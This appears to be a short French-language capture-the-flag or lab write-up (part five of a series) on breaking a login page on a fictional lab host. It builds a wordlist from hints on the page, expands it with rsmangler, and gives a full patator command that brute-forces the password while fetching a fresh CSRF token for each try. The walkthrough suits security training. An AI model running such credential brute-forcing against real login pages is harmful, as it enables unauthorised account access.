---
title: Writes-up 5
next: "/write-ups/wu6"
prev: "/write-ups/wu4"
---

se rendre sur la page http://lannister.castral-roc.lannisport.south/high_login.php 

Construire une wordlist avec les indicdes présents sur la page : 

James
Lannister
Cersei
Love
I

Les ajouter a un fichier.

Créer un fichier sortie_wordlist.txt avec un multitude de variations possible de ces mots : 

rsmangler --file custom_wordlist.txt --output sortie_wordlist.txt
pour nous pour verifier : cat sortie_wordlist.txt | grep "<ILoveCersei>"

patator http_fuzz url="http://lannister.castral-roc.lannisport.south/high_login.php" method=POST body="username=james.lannis&password=FILE0&csrf_token=RESPONSE1" accept_cookie=1 0=sortie_wordlist.txt before_urls="http://lannister.castral-roc.lannisport.south/high_login.php" before_egrep='RESPONSE1:csrf_token" value="([a-f0-9]{32})"' resolve="lannister.castral-roc.lannisport.south:10.10.10.1"

finir
